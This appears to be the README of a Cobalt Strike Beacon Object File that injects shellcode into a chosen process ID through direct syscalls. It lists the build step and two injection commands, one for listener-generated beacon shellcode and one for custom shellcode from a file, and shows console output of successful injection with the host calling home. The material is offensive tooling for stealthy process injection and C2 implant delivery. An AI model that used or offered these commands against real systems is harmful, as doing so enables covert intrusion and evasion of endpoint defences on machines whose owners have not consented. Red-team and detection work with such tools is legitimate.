
## Compile

```
make
```

## Usage

- `syscalls_inject PID listener_name` - Injects shellcode for beacon into target PID. 
- `syscalls_shinject PID path_to_bin` - Injects custom shellcode into target PID.

> NOTE: BOF is for 64-bit use only.

### Custom shellcode
```
beacon> syscalls_shinject 2268 C:\Users\user\Desktop\beacon64.bin
[*] Syscalls Shellcode Inject (@ajpc500)
[*] Reading shellcode from: C:\Users\user\Desktop\beacon64.bin
[+] host called home, sent: 266159 bytes
[+] received output:
Shellcode injection completed successfully!
```

### Beacon shellcode
```
beacon> syscalls_inject 13764 http
[*] Syscalls Shellcode Inject (@ajpc500)
[*] Using http listener for beacon shellcode generation.
[+] host called home, sent: 266159 bytes
[+] received output:
Shellcode injection completed successfully!
```
